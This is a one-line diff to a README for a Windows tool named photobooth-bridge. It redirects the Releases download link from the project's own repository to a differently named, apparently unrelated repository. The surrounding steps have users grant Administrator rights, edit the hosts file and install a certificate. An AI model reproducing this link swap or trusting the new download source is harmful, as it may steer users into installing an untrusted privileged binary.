@@ -61,7 +61,7 @@ found on either region's backend) instead of silently failing.
 
 > Requires Windows 10 or 11.
 
-1. Download `photobooth-bridge.exe` from the [Releases page](https://github.com/rivelia/photobooth-bridge/releases).
+1. Download `photobooth-bridge.exe` from the [Releases page](https://github.com/zty-201/naraka_qr_converter/releases).
 2. Double-click it. Windows will ask for Administrator — click Yes. (The bridge
    needs Admin to bind port 443 and edit the system hosts file.)
 3. The first time you run it, click **Install certificate and start bridge**.
